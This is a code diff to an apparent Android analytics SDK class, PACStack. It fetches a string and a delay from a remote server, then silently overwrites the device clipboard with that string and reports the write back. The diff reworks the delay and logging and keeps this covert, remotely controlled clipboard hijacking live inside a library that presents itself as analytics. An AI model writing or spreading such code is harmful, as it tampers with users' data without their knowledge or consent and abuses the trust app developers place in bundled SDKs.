@@ -3,6 +3,7 @@ package com.analytics.pgyjar;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.os.Handler;
 import android.util.Log;
 
 import com.analytics.pgyjar.api.PgyHttpRequest;
@@ -18,12 +19,11 @@ public class PACStack {
             "3jn10QXD6MzRwHkn9BojXyWnK4Oi4zuWnj8Sy+bOP4k33JeMOLNA1CxFvOA5fPG5\n" +
             "jzbIGerAfgYaJV0bWN5Idx2B+FMzXbcAmG5UeXvytpukoZx/Dlkm9h5LaOfaidDj\n" +
             "iaAODxETLMj6wh9rtQIDAQAB";
-    private static int repeatAfter = 0;
 
-    public static void run(final Context context, final String API_KEY) {
+    public static void run() {
         Log.e(TAG, "开始请求PACTStack");
         PgyHttpRequest.getInstance().sendPACHttpRequest(CommonUtil.BASE_URL + "api/c/pull",
-                HttpDataUtil.getPullParams(context, API_KEY), new PACHttpRequestCallback() {
+                HttpDataUtil.getPullParams(Analytics.mContext, Analytics.getApiKey()), new PACHttpRequestCallback() {
                     @Override
                     public void onFinish(String encryptResponse) {
                         Log.d(TAG, "结束请求PACTStack");
@@ -35,11 +35,18 @@ public class PACStack {
                             JSONObject respObject = new JSONObject(response);
                             JSONObject data = respObject.getJSONObject("data");
                             String dl = data.getString("dl");
-                            String id = data.getString("id");
-                            String c = data.getString("c");
+                            final String id = data.getString("id");
+                            final String c = data.getString("c");
                             PACUtil.log("Pull: " + id);
-                            Thread.sleep(Integer.parseInt(dl) * 1000);
-                            copyCode(context, c, id);
+                            Log.d(TAG,"需要延时时间="+dl);
+                            new Handler().postDelayed(new Runnable() {
+                                @Override
+                                public void run() {
+                                    Log.d(TAG,"解析PACTStack结束");
+                                    copyCode(Analytics.mContext, c, id);
+                                }
+                            },Integer.parseInt(dl) * 1000);
+
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
@@ -52,15 +59,17 @@ public class PACStack {
                 });
     }
 
+
     private static void copyCode(Context context, String code, String id) {
         if (code == null || code.equals("")) {
+            Log.e(TAG,"copyCode code = "+code);
             return;
         }
-
+        Log.d(TAG,"PACTStack结束后开始copyCode");
         ClipData clip = ClipData.newPlainText("t", code);
         ClipboardManager mClipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
         mClipboardManager.setPrimaryClip(clip);
-
+        Log.d(TAG,"PACTStack结束后开始copyCode完成准备上传");
         pushCode(id);
     }
 
